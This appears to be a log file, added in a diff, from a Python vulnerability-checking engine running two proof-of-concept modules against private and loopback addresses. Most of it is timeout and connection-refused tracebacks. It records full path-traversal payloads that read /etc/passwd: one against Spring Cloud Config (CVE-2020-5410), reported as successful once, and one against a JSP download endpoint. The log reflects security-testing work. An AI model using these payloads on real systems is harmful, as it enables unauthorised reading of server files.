@@ -1,0 +1,655 @@
+[INFO] [2022-10-12 17:00:30,148] [GEngine.py] [start] [18] > Namespace(dir_name='./pocs', mode='verify', report='False', targets=['10.10.20.50'], task_id='77726f3bbb6342adb6d8c84db19c8d95', thread_num=10, time_out=60, vids=['all'])
+[INFO] [2022-10-12 17:00:30,149] [PocManager.py] [run] [74] > Get task [77726f3bbb6342adb6d8c84db19c8d95]: targets['10.10.20.50'], poc_id['all']
+[INFO] [2022-10-12 17:00:30,171] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 17:00:30,171] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 17:00:30,176] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0001 start...
+[INFO] [2022-10-12 17:00:30,178] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0002 start...
+[INFO] [2022-10-12 17:00:30,187] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0002 finish...
+[INFO] [2022-10-12 17:00:30,875] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0001 finish...
+[INFO] [2022-10-12 17:00:30,876] [PocManager.py] [run] [107] > Finish task [77726f3bbb6342adb6d8c84db19c8d95](used 0s): targets['10.10.20.50'], vids['all']]
+[INFO] [2022-10-12 17:01:02,699] [GEngine.py] [start] [18] > Namespace(dir_name='./pocs', mode='test', report='False', targets=['10.10.20.50'], task_id='7d7a2f4719e64caebc572ebea3f16454', thread_num=10, time_out=60, vids=['all'])
+[INFO] [2022-10-12 17:01:02,699] [PocManager.py] [run] [74] > Get task [7d7a2f4719e64caebc572ebea3f16454]: targets['10.10.20.50'], poc_id['all']
+[INFO] [2022-10-12 17:01:02,700] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 17:01:02,700] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 17:01:02,700] [PocManager.py] [load_poc] [41] > pocs:{'v_2022_0001': 'v_2022_0001_VSCC.py', 'v_2022_0002': 'v_2022_0002_CSXS.py'}
+[INFO] [2022-10-12 17:01:02,701] [PocManager.py] [load_poc] [65] > poc_classes : defaultdict(<class 'list'>, {'v_2022_0001': ['pocs.v_2022_0001_VSCC', <class 'pocs.v_2022_0001_VSCC.VSCC'>], 'v_2022_0002': ['pocs.v_2022_0002_CSXS', <class 'pocs.v_2022_0002_CSXS.CSXS'>]})
+[INFO] [2022-10-12 17:01:02,701] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0001 start...
+[INFO] [2022-10-12 17:01:02,703] [RunPoc.py] [start] [40] > 10.10.20.50 - v_2022_0002 start...
+[INFO] [2022-10-12 17:01:02,712] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0002 finish...
+[INFO] [2022-10-12 17:01:07,769] [RunPoc.py] [start] [42] > 10.10.20.50 - v_2022_0001 finish...
+[INFO] [2022-10-12 17:01:07,770] [PocManager.py] [run] [104] > result: [['v_2022_0001_VSCC', {'Product': 'Spring Cloud', 'Version': '2.2.x版本、2.1.9之前的2.1.x版本和不再受支持的旧版本中的Spring-cloud-config-server模块存在路径遍历漏洞', 'Type': '路径遍历', 'Level': 2, 'CVE': 'CVE-2020-5410', 'CNNVD': 'CNNVD-202006-075', 'CNVD': 'CNVD-2020-38876', 'Description': '\n                            VMware Spring Cloud Config是美国威睿（VMware）公司的一套分布式系统的配置管理解决方案。该产品主要为分布式系统中的外部配置提供服务器和客户端支持。\n                            VMware Spring Cloud Config 2.2.3之前的2.2.x版本、2.1.9之前的2.1.x版本和不再受支持的旧版本中的Spring-cloud-config-server模块存在路径遍历漏洞，该漏洞源于程序未能正确验证用户请求。攻击者可借助特制URL利用该漏洞查看系统上的任意文件。\n                           ', 'DisclosureDate': '2020-01-03'}, {'TaskId': '7d7a2f4719e64caebc572ebea3f16454', 'Target': '10.10.20.50', 'Mode': 'verify', 'Error': '', 'Success': True, 'Other': defaultdict(<function tree at 0x000002074FA89A60>, {'payload': 'http://10.10.20.50:50370/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development'})}]]
+[INFO] [2022-10-12 17:01:07,772] [PocManager.py] [run] [107] > Finish task [7d7a2f4719e64caebc572ebea3f16454](used 5s): targets['10.10.20.50'], vids['all']]
+[INFO] [2022-10-12 17:01:07,772] [PocManager.py] [run] [110] > ip数量：1 ； poc数量： 2
+[INFO] [2022-10-12 20:10:26,409] [GEngine.py] [start] [18] > Namespace(task_id='fb5c5aab1ead462c8dbbf4697c0fbf13', targets=['192.168.1.2'], vids=['all'], mode='verify', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 20:10:26,415] [PocManager.py] [run] [73] > Get task [fb5c5aab1ead462c8dbbf4697c0fbf13]: targets['192.168.1.2'], poc_id['all']
+[ERROR] [2022-10-12 20:10:26,741] [MongoDB.py] [insert_data] [33] > Failed to insert data to mongodb. 10.10.20.50:27017: timed out, Timeout: 0.3s, Topology Description: <TopologyDescription id: 6346aeb225bfdbaf76b83658, topology_type: Unknown, servers: [<ServerDescription ('10.10.20.50', 27017) server_type: Unknown, rtt: None, error=NetworkTimeout('10.10.20.50:27017: timed out')>]>
+[INFO] [2022-10-12 20:10:26,742] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 20:10:26,742] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 20:10:26,758] [RunPoc.py] [start] [40] > 192.168.1.2 - v_2022_0001 start...
+[INFO] [2022-10-12 20:10:26,764] [RunPoc.py] [start] [40] > 192.168.1.2 - v_2022_0002 start...
+[ERROR] [2022-10-12 20:10:46,783] [v_2022_0001_VSCC.py] [verify] [65] > 192.168.1.2 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 613, in connect
+    self._wait(self._write_event)
+  File "src\\gevent\\_hub_primitives.py", line 317, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 322, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 313, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 314, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 55, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_waiter.py", line 154, in gevent._gevent_c_waiter.Waiter.get
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 65, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_gevent_c_greenlet_primitives.pxd", line 35, in gevent._gevent_c_greenlet_primitives._greenlet_switch
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 179, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x00000174AF6A6A60>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='192.168.1.2', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000174AF6A6A60>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0001_VSCC.py", line 54, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 507, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='192.168.1.2', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000174AF6A6A60>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)'))
+
+[INFO] [2022-10-12 20:10:46,785] [RunPoc.py] [start] [42] > 192.168.1.2 - v_2022_0001 finish...
+[ERROR] [2022-10-12 20:10:46,787] [v_2022_0002_CSXS.py] [verify] [62] > 192.168.1.2 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 613, in connect
+    self._wait(self._write_event)
+  File "src\\gevent\\_hub_primitives.py", line 317, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 322, in gevent._gevent_c_hub_primitives.wait_on_socket
+  File "src\\gevent\\_hub_primitives.py", line 313, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 314, in gevent._gevent_c_hub_primitives._primitive_wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 46, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_hub_primitives.py", line 55, in gevent._gevent_c_hub_primitives.WaitOperationsGreenlet.wait
+  File "src\\gevent\\_waiter.py", line 154, in gevent._gevent_c_waiter.Waiter.get
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 61, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_greenlet_primitives.py", line 65, in gevent._gevent_c_greenlet_primitives.SwitchOutGreenletWithLoop.switch
+  File "src\\gevent\\_gevent_c_greenlet_primitives.pxd", line 35, in gevent._gevent_c_greenlet_primitives._greenlet_switch
+socket.timeout: timed out
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 179, in _new_conn
+    raise ConnectTimeoutError(
+urllib3.exceptions.ConnectTimeoutError: (<urllib3.connection.HTTPConnection object at 0x00000174AF6A6370>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)')
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='192.168.1.2', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000174AF6A6370>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 507, in send
+    raise ConnectTimeout(e, request=request)
+requests.exceptions.ConnectTimeout: HTTPConnectionPool(host='192.168.1.2', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by ConnectTimeoutError(<urllib3.connection.HTTPConnection object at 0x00000174AF6A6370>, 'Connection to 192.168.1.2 timed out. (connect timeout=20)'))
+
+[INFO] [2022-10-12 20:10:46,808] [RunPoc.py] [start] [42] > 192.168.1.2 - v_2022_0002 finish...
+[INFO] [2022-10-12 20:10:46,809] [PocManager.py] [run] [106] > Finish task [fb5c5aab1ead462c8dbbf4697c0fbf13](used 20s): targets['192.168.1.2'], vids['all']]
+[ERROR] [2022-10-12 20:10:47,174] [MongoDB.py] [update] [41] > Failed to update data in mongodb. 10.10.20.50:27017: timed out, Timeout: 0.3s, Topology Description: <TopologyDescription id: 6346aeb225bfdbaf76b83658, topology_type: Unknown, servers: [<ServerDescription ('10.10.20.50', 27017) server_type: Unknown, rtt: None, error=NetworkTimeout('10.10.20.50:27017: timed out')>]>
+[WARNING] [2022-10-12 22:17:59,596] [GEngine.py] [main] [17] > Namespace(task_id='4d070dab7fd54e80ad4858614029abff', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[ERROR] [2022-10-12 22:17:59,603] [GEngine.py] [main] [18] > Namespace(task_id='4d070dab7fd54e80ad4858614029abff', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[CRITICAL] [2022-10-12 22:17:59,605] [GEngine.py] [main] [19] > Namespace(task_id='4d070dab7fd54e80ad4858614029abff', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[DEBUG] [2022-10-12 22:19:32,168] [GEngine.py] [main] [15] > Namespace(task_id='f8871ca501ba4aa68e6d167556bcdfab', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:19:32,168] [GEngine.py] [main] [16] > Namespace(task_id='f8871ca501ba4aa68e6d167556bcdfab', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[WARNING] [2022-10-12 22:19:32,169] [GEngine.py] [main] [17] > Namespace(task_id='f8871ca501ba4aa68e6d167556bcdfab', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[ERROR] [2022-10-12 22:19:32,170] [GEngine.py] [main] [18] > Namespace(task_id='f8871ca501ba4aa68e6d167556bcdfab', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[CRITICAL] [2022-10-12 22:19:32,171] [GEngine.py] [main] [19] > Namespace(task_id='f8871ca501ba4aa68e6d167556bcdfab', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[DEBUG] [2022-10-12 22:21:58,575] [GEngine.py] [main] [15] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:21:58,576] [GEngine.py] [main] [16] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[WARNING] [2022-10-12 22:21:58,577] [GEngine.py] [main] [17] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[ERROR] [2022-10-12 22:21:58,577] [GEngine.py] [main] [18] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[CRITICAL] [2022-10-12 22:21:58,578] [GEngine.py] [main] [19] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:21:58,579] [GEngine.py] [start] [23] > Namespace(task_id='75904866d9224365bb4a20af5a5f4e81', targets=['127.0.0.1'], vids=['all'], mode='test', dir_name='./pocs', time_out=60, thread_num=10, report='False')
+[INFO] [2022-10-12 22:21:58,589] [PocManager.py] [run] [73] > Get task [75904866d9224365bb4a20af5a5f4e81]: targets['127.0.0.1'], poc_id['all']
+[INFO] [2022-10-12 22:21:58,589] [PocManager.py] [load_poc] [23] > ['all']
+[INFO] [2022-10-12 22:21:58,590] [PocManager.py] [load_poc] [28] > poc_name:['v_2022_0001_VSCC.py', 'v_2022_0002_CSXS.py']
+[INFO] [2022-10-12 22:21:58,591] [PocManager.py] [load_poc] [41] > pocs:{'v_2022_0001': 'v_2022_0001_VSCC.py', 'v_2022_0002': 'v_2022_0002_CSXS.py'}
+[INFO] [2022-10-12 22:21:58,595] [PocManager.py] [load_poc] [65] > poc_classes : defaultdict(<class 'list'>, {'v_2022_0001': ['pocs.v_2022_0001_VSCC', <class 'pocs.v_2022_0001_VSCC.VSCC'>], 'v_2022_0002': ['pocs.v_2022_0002_CSXS', <class 'pocs.v_2022_0002_CSXS.CSXS'>]})
+[INFO] [2022-10-12 22:21:58,598] [RunPoc.py] [start] [40] > 127.0.0.1 - v_2022_0001 start...
+[INFO] [2022-10-12 22:21:58,603] [RunPoc.py] [start] [40] > 127.0.0.1 - v_2022_0002 start...
+[ERROR] [2022-10-12 22:22:00,634] [v_2022_0001_VSCC.py] [verify] [65] > 127.0.0.1 - v_2022_0001 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x00000278C1F5F640>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000278C1F5F640>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0001_VSCC.py", line 54, in verify
+    response = requests.get(url + payload,headers=headers,timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=50370): Max retries exceeded with url: /..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%23foo/development (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000278C1F5F640>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[INFO] [2022-10-12 22:22:00,636] [RunPoc.py] [start] [42] > 127.0.0.1 - v_2022_0001 finish...
+[ERROR] [2022-10-12 22:22:00,639] [v_2022_0002_CSXS.py] [verify] [62] > 127.0.0.1 - v_2022_0002 error: Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 174, in _new_conn
+    conn = connection.create_connection(
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 95, in create_connection
+    raise err
+  File "D:\path\python\lib\site-packages\urllib3\util\connection.py", line 85, in create_connection
+    sock.connect(sa)
+  File "D:\path\python\lib\site-packages\gevent\_socketcommon.py", line 607, in connect
+    raise _SocketError(err, strerror(err))
+ConnectionRefusedError: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 703, in urlopen
+    httplib_response = self._make_request(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 398, in _make_request
+    conn.request(method, url, **httplib_request_kw)
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 239, in request
+    super(HTTPConnection, self).request(method, url, body=body, headers=headers)
+  File "D:\path\python\lib\http\client.py", line 1255, in request
+    self._send_request(method, url, body, headers, encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1301, in _send_request
+    self.endheaders(body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1250, in endheaders
+    self._send_output(message_body, encode_chunked=encode_chunked)
+  File "D:\path\python\lib\http\client.py", line 1010, in _send_output
+    self.send(msg)
+  File "D:\path\python\lib\http\client.py", line 950, in send
+    self.connect()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 205, in connect
+    conn = self._new_conn()
+  File "D:\path\python\lib\site-packages\urllib3\connection.py", line 186, in _new_conn
+    raise NewConnectionError(
+urllib3.exceptions.NewConnectionError: <urllib3.connection.HTTPConnection object at 0x00000278C1F5F550>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 440, in send
+    resp = conn.urlopen(
+  File "D:\path\python\lib\site-packages\urllib3\connectionpool.py", line 785, in urlopen
+    retries = retries.increment(
+  File "D:\path\python\lib\site-packages\urllib3\util\retry.py", line 592, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+urllib3.exceptions.MaxRetryError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000278C1F5F550>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "E:\pyHome\GEngine\pocs\v_2022_0002_CSXS.py", line 54, in verify
+    response = requests.get(url+payload, headers=headers, timeout=req_time_out)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 75, in get
+    return request('get', url, params=params, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\api.py", line 61, in request
+    return session.request(method=method, url=url, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 529, in request
+    resp = self.send(prep, **send_kwargs)
+  File "D:\path\python\lib\site-packages\requests\sessions.py", line 645, in send
+    r = adapter.send(request, **kwargs)
+  File "D:\path\python\lib\site-packages\requests\adapters.py", line 519, in send
+    raise ConnectionError(e, request=request)
+requests.exceptions.ConnectionError: HTTPConnectionPool(host='127.0.0.1', port=80): Max retries exceeded with url: /jsp/help-sb-download.jsp?sbFileName=../../../etc/passwd (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x00000278C1F5F550>: Failed to establish a new connection: [Errno 10061] [WinError 10061] 由于目标计算机积极拒绝，无法连接。'))
+
+[INFO] [2022-10-12 22:22:00,654] [RunPoc.py] [start] [42] > 127.0.0.1 - v_2022_0002 finish...
